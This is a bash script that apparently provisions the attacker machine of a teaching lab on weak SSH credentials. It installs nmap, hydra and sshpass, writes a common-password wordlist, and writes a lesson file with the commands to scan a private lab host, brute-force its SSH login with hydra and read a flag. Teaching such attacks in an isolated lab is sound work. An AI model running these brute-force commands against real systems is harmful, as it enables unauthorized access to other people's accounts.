#!/bin/bash
# ---------------------------------------------------------------
# Weak Credentials Lab – Attacker Provisioning
# ---------------------------------------------------------------
# Installs brute-force and credential-testing tools:
#   hydra   – network login brute-forcer
#   sshpass – non-interactive SSH password authentication
#   nmap    – port scanning (to confirm SSH is open)
#
# Also creates a small wordlist for the student to use.
# ---------------------------------------------------------------

echo "Starting provisioning for Attacker machine (weak_creds_lab)..."

export DEBIAN_FRONTEND=noninteractive
apt-get update -y

# Install open-vm-tools so VMware Desktop provider can communicate with this guest
apt-get install -y open-vm-tools

apt-get install -y net-tools curl wget nmap hydra sshpass

# Create a small wordlist containing common weak passwords
# (intentionally includes the target password so the lab is solvable)
cat > /home/vagrant/wordlist.txt <<'EOF'
password
123456
admin
root
letmein
qwerty
abc123
monkey
dragon
master
welcome
login
princess
football
shadow
sunshine
trustno1
iloveyou
batman
access
EOF
chown vagrant:vagrant /home/vagrant/wordlist.txt

# Write the scenario instructions to the attacker's home directory
cat > /home/vagrant/lesson.txt <<'EOF'
Weak Credentials Lab: Brute-forcing SSH credentials

  Task:
    The victim machine (192.168.56.41) has an SSH service
    running with a user account protected by a weak password.
    Your task is to use nmap to confirm SSH is open, then use hydra to brute-
    force the password and log in to retrieve the flag.

  USEFUL COMMANDS:

    Confirm SSH is open on the victim:
      nmap -p 22 192.168.56.41

    Brute-force SSH credentials with hydra:
      hydra -l ctfuser -P ~/wordlist.txt -t 4 ssh://192.168.56.41

    Log in once the password is found:
      ssh ctfuser@192.168.56.41

    Read the flag after logging in:
      cat ~/flag.txt

=====================================================
EOF
chown vagrant:vagrant /home/vagrant/lesson.txt

echo "Attacker machine provisioned successfully!"
